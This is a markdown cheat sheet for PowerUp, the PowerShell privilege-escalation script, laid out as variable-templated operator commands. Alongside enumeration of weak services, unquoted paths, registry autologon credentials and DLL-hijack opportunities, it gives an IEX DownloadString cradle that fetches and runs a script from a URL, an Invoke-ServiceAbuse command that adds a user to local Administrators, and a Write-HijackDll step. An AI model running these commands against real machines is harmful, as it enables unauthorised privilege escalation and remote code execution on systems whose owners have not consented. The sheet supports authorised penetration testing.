---
technique: PowerUp
category: privilege-escalation
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows lpe powerup powersploit services registry dll-hijacking
---

# PowerUp

PowerUp is a PowerShell privilege escalation helper that checks common Windows misconfigurations such as weak services, unquoted service paths, AlwaysInstallElevated, modifiable autoruns, and DLL hijack opportunities.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| PowerShell | PowerUp runs inside a PowerShell session |
| Script access | Load PowerUp from disk or a trusted internal staging server |
| Local context | Findings depend on current user rights and host configuration |

## Windows

### Import local module

#powershell #powerup

Import PowerUp from disk.

```powershell title:"Import PowerUp from local file"
Import-Module .\PowerUp.ps1
```
<!-- cheat -->

### Load from URL

#powershell #powerup

Load PowerUp directly into the current PowerShell session from a URL.

```powershell title:"Load PowerUp from URL"
IEX(New-Object Net.WebClient).DownloadString('$url')
```
<!-- cheat
var url
-->

### Run all checks

#powershell #powerup #recon

Run all PowerUp privilege escalation checks.

```powershell title:"Run all PowerUp checks"
Invoke-AllChecks
```
<!-- cheat -->

### Run verbose checks

#powershell #powerup #recon

Run all checks with verbose output.

```powershell title:"Run all PowerUp checks verbosely"
Invoke-AllChecks -Verbose
```
<!-- cheat -->

### Find modifiable services

#powershell #powerup #services

Find services the current user can modify.

```powershell title:"Find modifiable services with PowerUp"
Get-ModifiableService
```
<!-- cheat -->

### Find unquoted service paths

#powershell #powerup #services

Find services with unquoted paths.

```powershell title:"Find unquoted service paths with PowerUp"
Get-UnquotedService
```
<!-- cheat -->

### Find modifiable service binaries

#powershell #powerup #services

Find services whose binaries the current user can modify.

```powershell title:"Find modifiable service binaries with PowerUp"
Get-ModifiableServiceFile
```
<!-- cheat -->

### Abuse modifiable service

#powershell #powerup #services

Abuse a modifiable service to add a user to the local Administrators group.

```powershell title:"Abuse modifiable service with PowerUp"
Invoke-ServiceAbuse -Name "$service_name" -UserName "$user"
```
<!-- cheat
var service_name
var user
-->

### Check AlwaysInstallElevated

#powershell #powerup #registry

Check the AlwaysInstallElevated registry keys.

```powershell title:"Check AlwaysInstallElevated with PowerUp"
Get-RegistryAlwaysInstallElevated
```
<!-- cheat -->

### Check autologon credentials

#powershell #powerup #registry

Check registry autologon values for plaintext credentials.

```powershell title:"Check autologon credentials with PowerUp"
Get-RegistryAutoLogon
```
<!-- cheat -->

### Find modifiable autoruns

#powershell #powerup #autoruns

Find registry autoruns the current user can modify.

```powershell title:"Find modifiable registry autoruns with PowerUp"
Get-ModifiableRegistryAutoRun
```
<!-- cheat -->

### Find process DLL hijacks

#powershell #powerup #dll-hijack

Find DLL hijack opportunities in running process paths.

```powershell title:"Find process DLL hijacks with PowerUp"
Find-ProcessDLLHijack
```
<!-- cheat -->

### Find PATH DLL hijacks

#powershell #powerup #dll-hijack

Find writable directories in PATH that can support DLL hijacking.

```powershell title:"Find PATH DLL hijacks with PowerUp"
Find-PathDLLHijack
```
<!-- cheat -->

### Write hijack DLL

#powershell #powerup #dll-hijack

Write a hijack DLL to a target path.

```powershell title:"Write hijack DLL with PowerUp"
Write-HijackDll -DllPath "$dll_path"
```
<!-- cheat
var dll_path
-->

## Linux

No Linux operator command is included here. This note covers local Windows PowerUp usage.
